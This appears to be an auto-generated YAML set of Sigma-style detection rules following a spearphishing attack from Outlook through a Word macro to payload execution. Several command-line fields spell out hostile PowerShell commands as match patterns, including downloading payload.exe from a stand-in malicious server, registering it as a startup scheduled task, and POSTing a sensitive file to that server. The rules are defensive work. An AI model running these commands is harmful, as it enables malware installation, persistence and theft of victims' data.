```yaml
- title: Identify Initial Access via Spearphishing Email
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Detects when a user opens a spearphishing email with a malicious attachment.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
        Cmdline: "OUTLOOK.EXE"
        Type: "Process"
      dstNode:
        Name: "Invoice.docx"
        Type: "File"
      relation: "Process Create"
  condition: selection
  tags:
    - T1566
    - Initial Access
  level: high
---
- title: Map Document Execution
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Detects when a user opens the Invoice.docx file in Microsoft Word.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
        Cmdline: "WINWORD.EXE Invoice.docx"
        Type: "Process"
      dstNode:
        Name: "Invoice.docx"
        Type: "File"
      relation: "Process Create"
  condition: selection
  tags:
    - T1203
    - Initial Access
  level: high
---
- title: Capture PowerShell Execution
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Detects the execution of PowerShell commands triggered by the macro in the document.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        Cmdline: "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\\Users\\Victim\\Downloads\\payload.exe'\""
        Type: "Process"
      dstNode:
        Name: "payload.exe"
        Type: "File"
      relation: "Process Create"
  condition: selection
  tags:
    - T1059
    - Execution
  level: high
---
- title: Track Payload Execution
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Detects when the user executes the downloaded payload.exe.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\explorer.exe"
        Cmdline: "explorer.exe C:\\Users\\Victim\\Downloads\\payload.exe"
        Type: "Process"
      dstNode:
        Name: "payload.exe"
        Type: "File"
      relation: "Process Create"
  condition: selection
  tags:
    - T1203
    - Execution
  level: high
---
- title: Monitor for Persistence Creation
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Detects the creation of a scheduled task using PowerShell for persistence.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        Cmdline: "powershell.exe -Command \"New-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'C:\\Users\\Victim\\Downloads\\payload.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -Register -TaskName 'MaliciousTask'\""
        Type: "Process"
      dstNode:
        Name: "MaliciousTask"
        Type: "Registry"
      relation: "Process Create"
  condition: selection
  tags:
    - T1053
    - Persistence
  level: high
---
- title: Detect Data Exfiltration
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Identifies when the payload executes commands to exfiltrate data to an external server.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode:
        Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        Cmdline: "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://malicious-server.com/exfiltrate' -Method POST -Body (Get-Content 'C:\\Users\\Victim\\Documents\\sensitive_data.txt')\""
        Type: "Process"
      dstNode:
        Dstaddress: "http://malicious-server.com/exfiltrate"
        Type: "Network"
      relation: "Process Create"
  condition: selection
  tags:
    - T1041
    - Exfiltration
  level: high
```